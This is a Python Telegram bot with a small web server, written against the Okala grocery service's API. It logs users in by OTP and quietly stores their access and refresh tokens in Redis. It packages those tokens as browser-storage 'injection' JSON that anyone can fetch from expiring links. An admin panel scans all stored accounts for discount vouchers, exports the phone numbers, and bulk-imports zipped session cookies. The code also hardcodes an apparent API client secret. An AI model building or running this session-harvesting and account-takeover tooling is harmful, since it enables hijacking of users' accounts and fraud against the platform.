import os
import json
import logging
import asyncio
import uuid
import urllib.parse
import time
import io
import base64
import tempfile
import shutil
import requests
import redis.asyncio as redis 
from concurrent.futures import ThreadPoolExecutor
from aiohttp import web
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379")
redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "http://localhost:8080")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0")) 

PHONE, OTP, ASK_NAME = range(3)
executor = ThreadPoolExecutor(max_workers=10)

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Origin": "https://www.okala.com",
    "Referer": "https://www.okala.com/"
}

# ==========================================
# توابع پس‌زمینه (تخفیف‌ها)
# ==========================================
def get_user_id_from_token(token):
    try:
        payload = token.split('.')[1]
        payload += '=' * (-len(payload) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload)
        decoded_json = json.loads(decoded_bytes)
        return decoded_json.get('cerberusId') or decoded_json.get('alternativeCustomerId')
    except Exception:
        return None

async def process_discounts_and_send_report(bot, acc_keys):
    report_text = "🎁 **گزارش کدهای تخفیف:**\n\n"
    found_any = False
    
    for key in acc_keys:
        phone = key.replace("account:", "")
        token_data = await redis_client.hgetall(key)
        access_token = token_data.get("access_token")
        
        if not access_token: continue
        
        user_uuid = get_user_id_from_token(access_token)
        if not user_uuid: continue
            
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Accept': 'application/json, text/plain, */*',
            'source': 'okala',
            'ui-version': '2.0',
            'origin': 'https://www.okala.com',
            'User-Agent': BASE_HEADERS["User-Agent"]
        }
        
        url = f"https://apigateway.okala.com/api/discount/v1/discounts/customer/{user_uuid}"
        
        try:
            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, timeout=10))
            
            if response.status_code == 200:
                data = response.json()
                vouchers = data.get('data', [])
                
                if vouchers:
                    found_any = True
                    report_text += f"📱 `{phone}`: دارای {len(vouchers)} تخفیف فعال\n"
        except Exception as e:
            logging.error(f"Error checking discount for {phone}: {e}")
            
    if not found_any:
        report_text += "هیچ تخفیف فعالی در اکانت‌ها یافت نشد."
        
    if len(report_text) > 4000:
        file_out = io.BytesIO(report_text.encode('utf-8'))
        file_out.name = f"Okala_Discounts_{int(time.time())}.txt"
        await bot.send_document(chat_id=ADMIN_ID, document=file_out, caption="📄 گزارش کامل تخفیف‌ها")
    else:
        await bot.send_message(chat_id=ADMIN_ID, text=report_text, parse_mode='Markdown')

# ==========================================
# بخش توابع تبدیل دیتا
# ==========================================
def format_for_injector(auth_data):
    access_token = auth_data.get("access_token", "")
    refresh_token = auth_data.get("refresh_token", "")
    user_info = auth_data.get("UserInfo", {})
    
    user_dict = {
        "id": user_info.get("Id", 0), "alternativeId": user_info.get("AlternativeId", ""), "alternativeCustomerId": user_info.get("AlternativeCustomerId", 0),
        "firstName": user_info.get("FirstName", ""), "lastName": user_info.get("LastName", ""), "birthDate": "", "genderCode": user_info.get("GenderCode", 1),
        "emailAddress": user_info.get("EmailAddress", ""), "userName": user_info.get("UserName", ""), "mobilePhone": user_info.get("MobilePhone", ""),
        "stateCode": user_info.get("StateCode", 1), "customerIsLoggedInForFirstTime": user_info.get("CustomerIsLoggedInForFirstTime", False),
        "firstLoginDateTime": user_info.get("FirstLoginDateTime", ""), "state": user_info.get("State", False),
        "hasAddress": user_info.get("HasAddress", False), "birthDateEpoch": user_info.get("BirthDateEpoch", 0)
    }
    
    user_url_encoded = urllib.parse.quote(json.dumps(user_dict, ensure_ascii=False))
    persist_user_inner = user_dict.copy()
    persist_user_inner["token"] = access_token
    
    persist_root_dict = {
        "user": json.dumps({"user": persist_user_inner, "discountCode": None}, ensure_ascii=False),
        "cart": json.dumps({"cartData": [], "totalCartsCount": 0, "showDrawer": False, "cartTotalPrice": 0}),
        "mapInfo": json.dumps({"defaultViewPort": {"latitude": 35.69976, "longitude": 51.33808, "id": 129, "name": "تهران"}, "viewport": {"latitude": 35.69976, "longitude": 51.33808}, "selectedCity": {"id": 129, "name": "تهران", "lat": 35.69975, "lng": 51.33551}, "mapCityName": "تهران"}, ensure_ascii=False),
        "eventData": json.dumps({"isLoggedIn": True, "platform": "web", "viewedLayersCount": 0, "activeDiscountCodesCount": 0, "sessionLayersViewedCount": 0}),
        "_persist": json.dumps({"version": -1, "rehydrated": True})
    }
    
    persist_root_str = json.dumps(persist_root_dict, ensure_ascii=False)
    expire_time = int(time.time()) + 31536000 
    
    return {
        "origins": [{
            "origin": "https://www.okala.com",
            "localStorage": [
                {"name": "tokenMS", "value": access_token}, {"name": "user", "value": user_url_encoded},
                {"name": "city_name", "value": "تهران"}, {"name": "city_id", "value": "129"},
                {"name": "persist:root", "value": persist_root_str}
            ]
        }]
    }

# ==========================================
# پردازش فایل زیپ و تبدیل به لینک (جدید)
# ==========================================
async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    file_name = update.message.document.file_name.lower()
    if not file_name.endswith('.zip'):
        await update.message.reply_text("❌ لطفاً فقط فایل زیپ (.zip) ارسال کنید.")
        return
        
    msg = await update.message.reply_text("⏳ در حال دانلود و استخراج فایل زیپ...")
    
    expire_time = await redis_client.get("settings:expire_time")
    expire_time = int(expire_time) if expire_time else 7200
    
    new_file = await update.message.document.get_file()
    links_text = "🔗 **لیست لینک‌های تولید شده:**\n\n"
    count = 0
    
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        await new_file.download_to_drive(zip_path)
        
        extracted_dir = os.path.join(temp_dir, "extracted")
        # جلوگیری از قفل شدن ربات هنگام اکسترکت
        await asyncio.to_thread(shutil.unpack_archive, zip_path, extracted_dir)
        
        src_accounts = None
        for root, dirs, files in os.walk(extracted_dir):
            if 'accounts' in dirs and not src_accounts:
                src_accounts = os.path.join(root, 'accounts')
                break
                
        if not src_accounts:
            await msg.edit_text("❌ پوشه 'accounts' داخل فایل زیپ پیدا نشد.")
            return
            
        for filename in os.listdir(src_accounts):
            if not filename.endswith('.json'): continue
            
            file_path = os.path.join(src_accounts, filename)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    file_content = f.read()
                    data = json.loads(file_content)
                    
                    # ذخیره هوشمند در دیتابیس برای سیستم تخفیف‌ها
                    access_token, refresh_token = None, None
                    for cookie in data.get('cookies', []):
                        if cookie.get('name') == 'tokenMS': access_token = cookie.get('value')
                        elif cookie.get('name') == 'refresh_token': refresh_token = cookie.get('value')
                    
                    if not access_token:
                        for origin in data.get('origins', []):
                            for item in origin.get('localStorage', []):
                                if item.get('name') == 'tokenMS': access_token = item.get('value')
                                elif item.get('name') == 'refresh_token': refresh_token = item.get('value')
                    
                    phone = filename.replace('.json', '')
                    if access_token:
                        await redis_client.hset(f"account:{phone}", mapping={"access_token": access_token, "refresh_token": refresh_token or ""})
                    
                    # ساخت لینک
                    link_id = str(uuid.uuid4())[:12]
                    await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                    
                    final_url = f"{WEB_DOMAIN}/acc/{link_id}"
                    links_text += f"📱 {phone}:\n{final_url}\n\n"
                    count += 1
                    
            except Exception as e:
                logging.error(f"Error processing {filename}: {e}")
                
    if count == 0:
        await msg.edit_text("⚠️ هیچ اکانت معتبری (فایل JSON) در پوشه accounts یافت نشد.")
        return
        
    if len(links_text) > 4000:
        file_out = io.BytesIO(links_text.encode('utf-8'))
        file_out.name = f"Generated_Links_{int(time.time())}.txt"
        await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=f"✅ {count} اکانت استخراج، در دیتابیس ذخیره و لینک‌های آنها تولید شد.")
        await msg.delete()
    else:
        await msg.edit_text(f"✅ {count} اکانت با موفقیت ذخیره و تبدیل شد:\n\n{links_text}", disable_web_page_preview=True)

# ==========================================
# بخش مینی‌سرور وب
# ==========================================
async def web_handler_get_account(request):
    link_id = request.match_info.get('link_id', '')
    data = await redis_client.get(f"acc_link:{link_id}")
    if data:
        return web.json_response(json.loads(data))
    return web.json_response({"error": "لینک نامعتبر است یا منقضی شده."}, status=404)

async def start_web_server():
    app = web.Application()
    app.router.add_get('/acc/{link_id}', web_handler_get_account)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080)) 
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# بخش پنل مدیریت (Admin Panel)
# ==========================================
def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 آمار دیتابیس", callback_data="admin_stats"), InlineKeyboardButton("⏱ تنظیم انقضا", callback_data="admin_expire")],
        [InlineKeyboardButton("🎁 بررسی تخفیف‌ها", callback_data="admin_check_discounts"), InlineKeyboardButton("🔗 تبدیل زیپ به لینک", callback_data="admin_zip_to_link")],
        [InlineKeyboardButton("📥 استخراج شماره‌ها", callback_data="admin_export"), InlineKeyboardButton("🗑 پاکسازی", callback_data="admin_clear")],
        [InlineKeyboardButton("🔌 روشن/خاموش کردن ربات", callback_data="admin_toggle")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("👑 **به پنل مدیریت خوش آمدید:**", reply_markup=get_admin_keyboard(), parse_mode='Markdown')

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID: return
    await query.answer()
    
    data = query.data
    
    if data == "admin_stats":
        acc_keys = await redis_client.keys("account:*")
        link_keys = await redis_client.keys("acc_link:*")
        maint = await redis_client.get("settings:maintenance")
        exp = await redis_client.get("settings:expire_time")
        exp = int(exp) // 3600 if exp else 2
        status = "🔴 خاموش" if maint == "1" else "🟢 روشن"
        
        text = f"📊 **آمار سیستم:**\n\n👥 کل اکانت‌ها: `{len(acc_keys)}`\n🔗 لینک‌های فعال: `{len(link_keys)}`\n⏱ انقضای لینک‌ها: `{exp} ساعت`\nوضعیت ربات: {status}"
        await query.edit_message_text(text, reply_markup=get_admin_keyboard(), parse_mode='Markdown')
        
    elif data == "admin_expire":
        kb = [
            [InlineKeyboardButton("۱ ساعت", callback_data="set_exp_3600"), InlineKeyboardButton("۲ ساعت", callback_data="set_exp_7200")],
            [InlineKeyboardButton("۱۲ ساعت", callback_data="set_exp_43200"), InlineKeyboardButton("۲۴ ساعت", callback_data="set_exp_86400")],
            [InlineKeyboardButton("بازگشت 🔙", callback_data="admin_back")]
        ]
        await query.edit_message_text("⏱ **زمان انقضای لینک‌ها را انتخاب کنید:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        
    elif data.startswith("set_exp_"):
        new_time = int(data.split("_")[2])
        await redis_client.set("settings:expire_time", new_time)
        await query.edit_message_text(f"✅ انقضای لینک‌ها با موفقیت به `{new_time // 3600}` ساعت تغییر یافت.", reply_markup=get_admin_keyboard(), parse_mode='Markdown')

    elif data == "admin_check_discounts":
        acc_keys = await redis_client.keys("account:*")
        if not acc_keys:
            await query.message.reply_text("دیتابیس خالی است!")
            return
            
        await query.message.reply_text(f"🔍 در حال بررسی تخفیف‌های {len(acc_keys)} اکانت...\nاین عملیات در پس‌زمینه انجام می‌شود.")
        asyncio.create_task(process_discounts_and_send_report(context.bot, acc_keys))
        
    elif data == "admin_zip_to_link":
        await query.message.reply_text("📥 **تبدیل زیپ به لینک:**\n\nلطفاً یک فایل `.zip` (که حاوی پوشه accounts و فایل‌های JSON است) را در همین صفحه ارسال کنید تا ربات آنها را تبدیل کند.", parse_mode='Markdown')

    elif data == "admin_export":
        acc_keys = await redis_client.keys("account:*")
        if not acc_keys:
            await query.message.reply_text("دیتابیس خالی است!")
            return
        
        export_text = "لیست شماره‌های ثبت شده در ربات:\n\n"
        for key in acc_keys:
            export_text += f"{key.replace('account:', '')}\n"
            
        file_out = io.BytesIO(export_text.encode('utf-8'))
        file_out.name = f"Okala_Accounts_{int(time.time())}.txt"
        await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=f"📥 فایل حاوی {len(acc_keys)} اکانت")
        
    elif data == "admin_clear":
        kb = [[InlineKeyboardButton("⚠️ بله، همه چیز پاک شود!", callback_data="admin_clear_confirm"), InlineKeyboardButton("لغو ❌", callback_data="admin_back")]]
        await query.edit_message_text("⚠️ **آیا مطمئن هستید؟** این کار تمام توکن‌ها را پاک می‌کند!", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        
    elif data == "admin_clear_confirm":
        acc_keys = await redis_client.keys("account:*")
        if acc_keys: await redis_client.delete(*acc_keys)
        await query.edit_message_text("🗑 تمام اکانت‌ها با موفقیت پاک شدند.", reply_markup=get_admin_keyboard())
        
    elif data == "admin_toggle":
        current = await redis_client.get("settings:maintenance")
        new_val = "0" if current == "1" else "1"
        await redis_client.set("settings:maintenance", new_val)
        status = "🔴 خاموش (تعمیرات)" if new_val == "1" else "🟢 روشن (فعال)"
        await query.edit_message_text(f"وضعیت ربات تغییر یافت:\nوضعیت فعلی: **{status}**", reply_markup=get_admin_keyboard(), parse_mode='Markdown')
        
    elif data == "admin_back":
        await query.edit_message_text("👑 **به پنل مدیریت خوش آمدید:**", reply_markup=get_admin_keyboard(), parse_mode='Markdown')

# ==========================================
# بخش ربات تلگرام (مراحل لاگین)
# ==========================================
async def async_request(method, url, **kwargs):
    loop = asyncio.get_running_loop()
    if method.upper() == 'POST': return await loop.run_in_executor(executor, lambda: requests.post(url, **kwargs))
    return await loop.run_in_executor(executor, lambda: requests.get(url, **kwargs))

def get_user_headers(context: ContextTypes.DEFAULT_TYPE):
    if 'device_id' not in context.user_data:
        context.user_data['device_id'] = str(uuid.uuid4())
        context.user_data['session_id'] = str(uuid.uuid4())
    headers = BASE_HEADERS.copy()
    headers['X-User-Unique-Id'] = context.user_data['device_id']
    headers['session-id'] = context.user_data['session_id']
    return headers

async def check_maintenance(update: Update) -> bool:
    maint = await redis_client.get("settings:maintenance")
    if maint == "1" and update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⚠️ ربات در حال حاضر برای بروزرسانی موقتاً خاموش است. لطفاً بعداً تلاش کنید.")
        return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if await check_maintenance(update): return ConversationHandler.END
    await update.message.reply_text("📞 لطفاً شماره موبایل خود را برای ورود به اکالا وارد کنید:")
    return PHONE

async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if await check_maintenance(update): return ConversationHandler.END
    phone = update.message.text.strip()
    context.user_data['phone'] = phone

    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}

    response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
    if response.status_code == 200:
        await update.message.reply_text("✅ کد تایید پیامک شد. لطفاً آن را ارسال کنید:")
        return OTP
    else:
        await update.message.reply_text(f"❌ خطا در ارسال کد: {response.status_code}")
        return ConversationHandler.END

async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp_code = update.message.text.strip()
    phone = context.user_data.get('phone')
    msg = await update.message.reply_text("⏳ در حال احراز هویت...")

    token_url = "https://apigateway.okala.com/api/v1/accounts/tokens"
    payload = {"mobile_number": phone, "otp_code": otp_code, "grant_type": "customer_grant_type", "client_id": "customer_client_id", "client_secret": "u_M{'57j!%LI21#", "client_name": "customer_client_name", "device_type_code": 7, "scope": "offline_access", "loginDuration": 4815}
    
    headers = get_user_headers(context)
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    response = await async_request('POST', token_url, data=payload, headers=headers)
    if response.status_code == 200:
        auth_data = response.json()
        context.user_data['auth_data'] = auth_data 
        
        if auth_data.get("access_token"):
            await redis_client.hset(f"account:{phone}", mapping={"access_token": auth_data.get("access_token"), "refresh_token": auth_data.get("refresh_token")})

        if not auth_data.get("UserInfo", {}).get("HasName", False):
            await msg.edit_text("⚠️ حساب فاقد نام است. نام و نام خانوادگی را وارد کنید:")
            return ASK_NAME
        else:
            return await generate_and_send_link(update, context, msg)
    else:
        await msg.edit_text("❌ کد اشتباه است یا منقضی شده. مجدداً /start کنید.")
        return ConversationHandler.END

async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    full_name = update.message.text.strip()
    if not full_name: return ASK_NAME

    parts = full_name.split(maxsplit=1)
    msg = await update.message.reply_text("⏳ در حال ثبت اطلاعات هویتی...")
    
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/UpdateCustomer" 
    headers = get_user_headers(context)
    headers["Authorization"] = f"Bearer {context.user_data['auth_data'].get('access_token')}"
    
    payload = {"birthDate": "", "birthDateEpoch": 700086600, "customerType": 0, "firstName": parts[0], "genderCode": 1, "genderTitle": "مذکر", "lastName": parts[1] if len(parts)>1 else "", "gender": "male"}
    
    await async_request('POST', url, json=payload, headers=headers)
    return await generate_and_send_link(update, context, msg)

async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg) -> int:
    auth_data = context.user_data.get('auth_data')
    injection_json = format_for_injector(auth_data)
    link_id = str(uuid.uuid4())[:12]
    
    expire_time = await redis_client.get("settings:expire_time")
    expire_time = int(expire_time) if expire_time else 7200
    
    await redis_client.setex(f"acc_link:{link_id}", expire_time, json.dumps(injection_json, ensure_ascii=False))
    
    final_url = f"{WEB_DOMAIN}/acc/{link_id}"
    
    success_text = (
        "✅ <b>لاگین با موفقیت انجام شد!</b>\n\n"
        f"<code>{final_url}</code>\n\n"
        f"<i>(🔒 لینک تا {expire_time // 3600} ساعت آینده معتبر است)</i>"
    )
    
    await status_msg.edit_text(success_text, parse_mode='HTML')
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("عملیات لغو شد.")
    return ConversationHandler.END

# ==========================================
# بخش راه‌اندازی اصلی
# ==========================================
async def main():
    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    await start_web_server()

    application = Application.builder().token(BOT_TOKEN).build()
    
    # هندلرهای ادمین
    application.add_handler(CommandHandler('admin', admin_command))
    application.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_exp_"))
    
    # هندلر دریافت فایل زیپ
    application.add_handler(MessageHandler(filters.Document.FileExtension("zip"), handle_zip_upload))

    # هندلرهای لاگین
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, request_otp)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, verify_otp_and_check_name)],
            ASK_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_name_and_continue)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logging.info("🚀 System is running with Admin Panel & Zip Extractor...")
    stop_signal = asyncio.Event()
    await stop_signal.wait()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
